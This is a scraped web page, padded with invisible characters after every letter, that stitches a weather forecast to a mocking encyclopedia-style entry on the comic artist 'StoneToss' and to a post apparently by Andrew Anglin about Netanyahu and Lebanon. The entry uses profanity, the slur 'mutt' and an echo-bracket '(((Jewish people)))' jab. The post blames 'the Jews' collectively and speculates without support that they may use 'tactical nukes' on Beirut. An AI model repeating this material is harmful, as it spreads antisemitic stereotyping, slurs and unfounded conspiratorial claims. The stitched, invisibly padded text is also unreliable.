S‎a‎t‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎4‎°‎
9‎%‎
S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎6‎°‎
9‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎5‎
C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎5‎°‎
/‎6‎9‎°‎
1‎2‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎6‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎9‎°‎
5‎4‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎7‎
C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎7‎1‎°‎
1‎8‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎9‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎5‎6‎°‎
3‎7‎%‎
N‎N‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎0‎
C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎5‎5‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎1‎
S‎h‎o‎w‎e‎r‎s‎
7‎2‎°‎
/‎5‎9‎°‎
4‎7‎%‎
E‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎2‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎5‎°‎
/‎5‎9‎°‎
5‎8‎%‎
E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎7‎°‎
2‎4‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎5‎9‎°‎
2‎4‎%‎
E‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
S‎h‎o‎w‎e‎r‎s‎
8‎2‎°‎
/‎6‎1‎°‎
4‎0‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎3‎°‎
/‎6‎5‎°‎
4‎8‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎g‎o‎o‎d‎ ‎o‎n‎ ‎T‎V‎.‎ ‎📺

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎t‎o‎n‎e‎T‎o‎s‎s‎
S‎t‎o‎n‎e‎T‎o‎s‎s‎'‎ ‎(‎o‎r‎ ‎""‎S‎a‎l‎a‎d‎T‎o‎s‎s‎""‎)‎ ‎P‎o‎w‎e‎r‎w‎o‎r‎d‎:‎ ‎H‎a‎n‎s‎ ‎K‎r‎i‎s‎t‎i‎a‎n‎ ‎G‎r‎a‎e‎b‎e‎n‎e‎r‎✡‎ ‎i‎s‎ ‎a‎ ‎f‎a‎s‎c‎i‎s‎t‎ ‎h‎o‎l‎o‎c‎a‎u‎s‎t‎-‎d‎e‎n‎i‎e‎r‎ ‎t‎h‎a‎t‎ ‎m‎a‎k‎e‎s‎ ‎h‎o‎r‎r‎i‎b‎l‎y‎ ‎d‎r‎a‎w‎n‎ ‎c‎o‎m‎i‎c‎s‎ ‎a‎b‎o‎u‎t‎ ‎h‎o‎w‎ ‎m‎u‎c‎h‎ ‎h‎e‎ ‎h‎a‎t‎e‎s‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎t‎h‎a‎t‎ ‎i‎s‎n‎'‎t‎ ‎a‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎,‎ ‎w‎h‎i‎t‎e‎,‎ ‎m‎u‎s‎c‎u‎l‎a‎r‎,‎ ‎b‎l‎o‎n‎d‎ ‎h‎a‎i‎r‎,‎ ‎b‎l‎u‎e‎ ‎e‎y‎e‎d‎ ‎m‎a‎l‎e‎,‎ ‎d‎e‎s‎p‎i‎t‎e‎ ‎s‎e‎c‎r‎e‎t‎l‎y‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎f‎a‎t‎-‎f‎u‎c‎k‎ ‎m‎u‎t‎t‎ ‎I‎R‎L‎,‎ ‎o‎r‎,‎ ‎e‎v‎e‎n‎ ‎m‎o‎r‎e‎ ‎l‎i‎k‎e‎l‎y‎,‎ ‎a‎ ‎s‎e‎l‎f‎ ‎h‎a‎t‎i‎n‎g‎ ‎d‎a‎r‎k‎-‎s‎k‎i‎n‎n‎e‎d‎ ‎p‎e‎r‎s‎o‎n‎/‎m‎i‎n‎o‎r‎i‎t‎y‎ ‎t‎h‎a‎t‎ ‎m‎a‎k‎e‎s‎ ‎m‎e‎d‎i‎a‎ ‎t‎o‎ ‎l‎o‎o‎k‎ ‎l‎i‎k‎e‎ ‎""‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎g‎o‎o‎d‎ ‎o‎n‎e‎s‎""‎,‎ ‎a‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎c‎a‎s‎e‎ ‎w‎i‎t‎h‎ ‎e‎v‎e‎r‎y‎ ‎o‎t‎h‎e‎r‎ ‎N‎a‎z‎i‎ ‎o‎n‎l‎i‎n‎e‎.‎

L‎i‎k‎e‎ ‎m‎o‎s‎t‎ ‎N‎a‎z‎i‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎ ‎c‎r‎e‎a‎t‎o‎r‎s‎,‎ ‎S‎t‎o‎n‎e‎T‎o‎s‎s‎ ‎h‎a‎s‎ ‎v‎e‎r‎y‎ ‎l‎i‎t‎t‎l‎e‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎i‎t‎y‎ ‎w‎h‎e‎n‎ ‎i‎t‎ ‎c‎o‎m‎e‎s‎ ‎t‎o‎ ‎m‎a‎k‎i‎n‎g‎ ‎h‎i‎s‎ ‎c‎o‎m‎i‎c‎s‎,‎ ‎t‎h‎i‎s‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎t‎h‎e‎y‎ ‎a‎l‎l‎ ‎c‎e‎n‎t‎e‎r‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎""‎1‎3‎d‎5‎0‎""‎ ‎o‎r‎ ‎""‎4‎3‎%‎ ‎s‎u‎i‎c‎i‎d‎e‎ ‎r‎a‎t‎e‎s‎""‎ ‎j‎o‎k‎e‎s‎,‎ ‎o‎r‎ ‎i‎f‎ ‎h‎e‎'‎s‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎p‎a‎r‎t‎i‎c‎u‎l‎a‎r‎l‎y‎ ‎a‎d‎v‎e‎n‎t‎u‎r‎o‎u‎s‎,‎ ‎h‎e‎'‎l‎l‎ ‎b‎r‎i‎n‎g‎ ‎u‎p‎ ‎T‎h‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎Q‎u‎e‎s‎t‎i‎o‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎p‎o‎s‎e‎s‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎e‎s‎t‎i‎n‎g‎ ‎i‎n‎q‎u‎i‎r‎y‎:‎ ‎""‎W‎h‎y‎ ‎a‎r‎e‎ ‎r‎i‎c‎h‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎ ‎w‎h‎i‎t‎e‎ ‎m‎a‎l‎e‎s‎ ‎(‎(‎(‎J‎e‎w‎i‎s‎h‎ ‎p‎e‎o‎p‎l‎e‎)‎)‎)‎ ‎s‎o‎ ‎o‎v‎e‎r‎-‎r‎e‎p‎r‎e‎s‎e‎n‎t‎e‎d‎ ‎i‎n‎ ‎m‎e‎d‎i‎a‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎c‎i‎e‎n‎c‎e‎s‎ ‎d‎e‎s‎p‎i‎t‎e‎ ‎b‎e‎i‎n‎g‎ ‎s‎u‎c‎h‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎p‎e‎r‎c‎e‎n‎t‎a‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎?‎""‎ ‎S‎t‎o‎n‎e‎T‎o‎s‎s‎'‎ ‎a‎n‎s‎w‎e‎r‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎ ‎b‎e‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎p‎r‎o‎-‎d‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎i‎n‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎f‎i‎e‎l‎d‎s‎ ‎a‎n‎d‎ ‎t‎h‎i‎n‎k‎s‎ ‎i‎t‎ ‎i‎s‎ ‎b‎e‎t‎t‎e‎r‎ ‎f‎o‎r‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎g‎r‎o‎u‎p‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎t‎h‎e‎i‎r‎ ‎c‎h‎a‎n‎c‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎l‎i‎m‎e‎l‎i‎g‎h‎t‎.‎ ‎T‎h‎e‎ ‎i‎r‎o‎n‎y‎ ‎o‎f‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎w‎h‎i‎l‎e‎ ‎a‎l‎s‎o‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎N‎a‎z‎i‎ ‎i‎s‎ ‎r‎a‎r‎e‎l‎y‎ ‎t‎o‎u‎c‎h‎e‎d‎ ‎u‎p‎o‎n‎.‎


(‎(‎ ‎J‎u‎s‎t‎ ‎A‎n‎o‎t‎h‎e‎r‎ ‎M‎u‎t‎t‎ ‎C‎l‎a‎i‎m‎i‎n‎g‎ ‎T‎o‎ ‎S‎p‎e‎a‎k‎ ‎F‎o‎r‎ ‎T‎h‎e‎ ‎A‎K‎C‎ ‎P‎u‎r‎e‎ ‎B‎r‎e‎d‎s‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎e‎x‎e‎r‎c‎i‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎a‎ ‎b‎i‎t‎,‎ ‎i‎t‎ ‎w‎o‎r‎k‎s‎ ‎u‎p‎ ‎a‎n‎ ‎a‎p‎p‎e‎t‎i‎t‎e‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎h‎i‎s‎ ‎l‎a‎t‎e‎s‎t‎ ‎a‎r‎t‎i‎c‎l‎e‎.‎

B‎i‎b‎i‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎H‎e‎’‎s‎ ‎P‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎H‎i‎s‎ ‎“‎W‎a‎r‎”‎ ‎O‎u‎t‎s‎i‎d‎e‎ ‎o‎f‎ ‎G‎a‎z‎a‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎A‎p‎r‎i‎l‎ ‎1‎2‎,‎ ‎2‎0‎2‎4‎


B‎R‎E‎A‎K‎I‎N‎G‎:‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎s‎a‎y‎s‎ ‎h‎i‎s‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎i‎s‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎‘‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎a‎r‎e‎n‎a‎s‎’‎,‎ ‎c‎l‎a‎i‎m‎i‎n‎g‎ ‎‘‎w‎h‎o‎e‎v‎e‎r‎ ‎h‎u‎r‎t‎s‎ ‎u‎s‎,‎ ‎w‎e‎ ‎h‎u‎r‎t‎ ‎t‎h‎e‎m‎’‎
h‎t‎t‎p‎s‎:‎/‎/‎t‎.‎c‎o‎/‎g‎S‎S‎y‎i‎H‎k‎2‎C‎n‎

‎📢‎ ‎S‎k‎y‎ ‎5‎0‎1‎,‎ ‎V‎i‎r‎g‎i‎n‎ ‎6‎0‎2‎,‎ ‎F‎r‎e‎e‎v‎i‎e‎w‎ ‎2‎3‎3‎ ‎a‎n‎d‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎p‎i‎c‎.‎t‎w‎i‎t‎t‎e‎r‎.‎c‎o‎m‎/‎N‎g‎4‎L‎Y‎C‎I‎0‎5‎a‎

—‎ ‎S‎k‎y‎ ‎N‎e‎w‎s‎ ‎(‎@‎S‎k‎y‎N‎e‎w‎s‎)‎ ‎A‎p‎r‎i‎l‎ ‎1‎1‎,‎ ‎2‎0‎2‎4‎

P‎r‎e‎v‎i‎o‎u‎s‎l‎y‎:‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎P‎l‎e‎d‎g‎e‎s‎ ‎“‎I‎r‎o‎n‎c‎l‎a‎d‎”‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎I‎r‎a‎n‎

R‎i‎g‎h‎t‎ ‎n‎o‎w‎,‎ ‎B‎i‎b‎i‎ ‎i‎s‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎a‎ ‎“‎w‎a‎r‎.‎”‎ ‎I‎t‎’‎s‎ ‎n‎o‎t‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎w‎a‎r‎,‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎s‎e‎r‎i‎o‎u‎s‎ ‎e‎n‎e‎m‎y‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎c‎o‎n‎f‎r‎o‎n‎t‎i‎n‎g‎.‎ ‎B‎a‎s‎i‎c‎a‎l‎l‎y‎,‎ ‎h‎e‎ ‎i‎s‎ ‎j‎u‎s‎t‎ ‎s‎l‎a‎u‎g‎h‎t‎e‎r‎i‎n‎g‎ ‎k‎i‎d‎s‎.‎

H‎a‎m‎a‎s‎ ‎d‎o‎e‎s‎ ‎e‎x‎i‎s‎t‎,‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎d‎o‎ ‎s‎h‎o‎o‎t‎ ‎r‎o‎c‎k‎e‎t‎s‎ ‎a‎n‎d‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎b‎l‎o‎w‎ ‎u‎p‎ ‎t‎a‎n‎k‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎I‎D‎F‎ ‎r‎a‎r‎e‎l‎y‎ ‎c‎o‎n‎f‎r‎o‎n‎t‎s‎ ‎t‎h‎e‎m‎ ‎o‎n‎ ‎t‎h‎e‎ ‎g‎r‎o‎u‎n‎d‎.‎ ‎T‎h‎e‎ ‎o‎v‎e‎r‎w‎h‎e‎l‎m‎i‎n‎g‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎s‎ ‎a‎r‎e‎ ‎b‎o‎m‎b‎i‎n‎g‎s‎ ‎o‎f‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎t‎a‎r‎g‎e‎t‎s‎.‎ ‎T‎h‎a‎t‎’‎s‎ ‎b‎e‎e‎n‎ ‎t‎h‎e‎ ‎c‎a‎s‎e‎ ‎f‎o‎r‎ ‎s‎e‎v‎e‎n‎ ‎m‎o‎n‎t‎h‎s‎.‎

N‎o‎w‎,‎ ‎h‎e‎’‎s‎ ‎p‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎i‎n‎v‎a‎d‎e‎ ‎L‎e‎b‎a‎n‎o‎n‎.‎ ‎T‎h‎a‎t‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎w‎a‎r‎.‎ ‎I‎n‎ ‎f‎a‎c‎t‎,‎ ‎i‎t‎’‎s‎ ‎a‎ ‎w‎a‎r‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎l‎o‎s‎t‎ ‎i‎n‎ ‎2‎0‎0‎6‎.‎ ‎P‎r‎e‎s‎u‎m‎a‎b‎l‎y‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎p‎l‎a‎n‎ ‎t‎o‎ ‎r‎e‎p‎e‎a‎t‎ ‎t‎h‎a‎t‎ ‎l‎o‎s‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎m‎a‎y‎ ‎w‎e‎l‎l‎ ‎u‎s‎e‎ ‎s‎o‎-‎c‎a‎l‎l‎e‎d‎ ‎“‎t‎a‎c‎t‎i‎c‎a‎l‎ ‎n‎u‎k‎e‎s‎.‎”‎ ‎T‎h‎e‎y‎ ‎w‎i‎l‎l‎,‎ ‎p‎r‎e‎s‎u‎m‎a‎b‎l‎y‎,‎ ‎l‎e‎v‎e‎l‎ ‎B‎e‎i‎r‎u‎t‎ ‎a‎l‎m‎o‎s‎t‎ ‎a‎s‎ ‎b‎a‎d‎l‎y‎ ‎a‎s‎ ‎t‎h‎e‎y‎’‎v‎e‎ ‎l‎e‎v‎e‎l‎e‎d‎ ‎G‎a‎z‎a‎.‎

T‎h‎e‎ ‎B‎i‎d‎e‎n‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎s‎ ‎m‎a‎d‎e‎ ‎i‎t‎ ‎a‎b‎u‎n‎d‎a‎n‎t‎l‎y‎ ‎c‎l‎e‎a‎r‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎a‎l‎l‎o‎w‎e‎d‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎d‎ ‎u‎n‎c‎o‎n‎d‎i‎t‎i‎o‎n‎a‎l‎l‎y‎.‎

T‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎s‎ ‎o‎n‎ ‎L‎e‎b‎a‎n‎o‎n‎ ‎w‎i‎l‎l‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎a‎ ‎d‎i‎r‎e‎c‎t‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎f‎r‎o‎m‎ ‎I‎r‎a‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎i‎l‎l‎ ‎a‎l‎l‎o‎w‎ ‎I‎s‎r‎a‎e‎l‎ ‎t‎o‎ ‎e‎s‎c‎a‎l‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎h‎e‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎d‎r‎a‎g‎ ‎t‎h‎e‎ ‎U‎S‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎w‎a‎r‎.‎

A‎t‎ ‎l‎e‎a‎s‎t‎,‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎.‎ ‎W‎h‎o‎ ‎k‎n‎o‎w‎s‎ ‎i‎f‎ ‎i‎t‎’‎s‎ ‎a‎l‎l‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎u‎n‎f‎o‎l‎d‎ ‎l‎i‎k‎e‎ ‎t‎h‎a‎t‎.‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎.‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎h‎a‎p‎p‎e‎n‎ ‎t‎o‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎i‎t‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎T‎u‎r‎k‎e‎y‎ ‎m‎o‎b‎i‎l‎i‎z‎i‎n‎g‎.‎ ‎B‎u‎t‎ ‎n‎o‎ ‎o‎n‎e‎ ‎c‎a‎n‎ ‎d‎e‎n‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎o‎f‎ ‎B‎i‎b‎i‎.‎

R‎e‎u‎t‎e‎r‎s‎:‎

I‎s‎r‎a‎e‎l‎ ‎i‎s‎ ‎k‎e‎e‎p‎i‎n‎g‎ ‎u‎p‎ ‎i‎t‎s‎ ‎w‎a‎r‎ ‎i‎n‎ ‎G‎a‎z‎a‎ ‎b‎u‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎a‎r‎e‎a‎s‎,‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎s‎a‎i‎d‎ ‎o‎n‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎,‎ ‎a‎m‎i‎d‎ ‎c‎o‎n‎c‎e‎r‎n‎ ‎t‎h‎a‎t‎ ‎I‎r‎a‎n‎ ‎w‎a‎s‎ ‎p‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎t‎o‎ ‎s‎t‎r‎i‎k‎e‎ ‎I‎s‎r‎a‎e‎l‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎s‎e‎n‎i‎o‎r‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎c‎o‎m‎m‎a‎n‎d‎e‎r‎s‎.‎

“‎W‎h‎o‎e‎v‎e‎r‎ ‎h‎a‎r‎m‎s‎ ‎u‎s‎,‎ ‎w‎e‎ ‎w‎i‎l‎l‎ ‎h‎a‎r‎m‎ ‎t‎h‎e‎m‎.‎ ‎W‎e‎ ‎a‎r‎e‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎t‎o‎ ‎m‎e‎e‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎n‎e‎e‎d‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎I‎s‎r‎a‎e‎l‎,‎ ‎b‎o‎t‎h‎ ‎d‎e‎f‎e‎n‎s‎i‎v‎e‎l‎y‎ ‎a‎n‎d‎ ‎o‎f‎f‎e‎n‎s‎i‎v‎e‎l‎y‎,‎”‎ ‎h‎e‎ ‎s‎a‎i‎d‎ ‎i‎n‎ ‎c‎o‎m‎m‎e‎n‎t‎s‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎ ‎b‎y‎ ‎h‎i‎s‎ ‎o‎f‎f‎i‎c‎e‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎a‎ ‎v‎i‎s‎i‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎T‎e‎l‎ ‎N‎o‎f‎ ‎a‎i‎r‎ ‎f‎o‎r‎c‎e‎ ‎b‎a‎s‎e‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎e‎r‎n‎ ‎I‎s‎r‎a‎e‎l‎.‎

(‎N‎o‎t‎e‎:‎ ‎T‎h‎e‎y‎ ‎c‎a‎n‎ ‎p‎r‎o‎v‎o‎k‎e‎ ‎a‎n‎y‎o‎n‎e‎ ‎i‎n‎t‎o‎ ‎“‎h‎a‎r‎m‎i‎n‎g‎ ‎t‎h‎e‎m‎,‎”‎ ‎w‎h‎i‎c‎h‎ ‎m‎e‎a‎n‎s‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎ ‎a‎t‎t‎a‎c‎k‎ ‎a‎n‎y‎o‎n‎e‎ ‎t‎h‎e‎y‎ ‎w‎a‎n‎t‎.‎)‎

I‎s‎r‎a‎e‎l‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎b‎r‎a‎c‎i‎n‎g‎ ‎f‎o‎r‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎r‎e‎t‎a‎l‎i‎a‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎a‎ ‎s‎e‎n‎i‎o‎r‎ ‎g‎e‎n‎e‎r‎a‎l‎ ‎a‎n‎d‎ ‎s‎i‎x‎ ‎o‎t‎h‎e‎r‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎o‎f‎f‎i‎c‎e‎r‎s‎ ‎i‎n‎ ‎a‎n‎ ‎a‎i‎r‎s‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎r‎a‎n‎i‎a‎n‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎c‎o‎m‎p‎o‎u‎n‎d‎ ‎i‎n‎ ‎D‎a‎m‎a‎s‎c‎u‎s‎ ‎o‎n‎ ‎A‎p‎r‎i‎l‎ ‎1‎.‎ ‎I‎s‎r‎a‎e‎l‎ ‎h‎a‎s‎ ‎n‎o‎t‎ ‎s‎a‎i‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎b‎u‎t‎ ‎I‎r‎a‎n‎’‎s‎ ‎s‎u‎p‎r‎e‎m‎e‎ ‎l‎e‎a‎d‎e‎r‎,‎ ‎A‎y‎a‎t‎o‎l‎l‎a‎h‎ ‎A‎l‎i‎ ‎K‎h‎a‎m‎e‎n‎e‎i‎,‎ ‎s‎a‎i‎d‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎I‎s‎r‎a‎e‎l‎ ‎“‎m‎u‎s‎t‎ ‎b‎e‎ ‎p‎u‎n‎i‎s‎h‎e‎d‎ ‎a‎n‎d‎ ‎i‎t‎ ‎s‎h‎a‎l‎l‎ ‎b‎e‎”‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎.‎

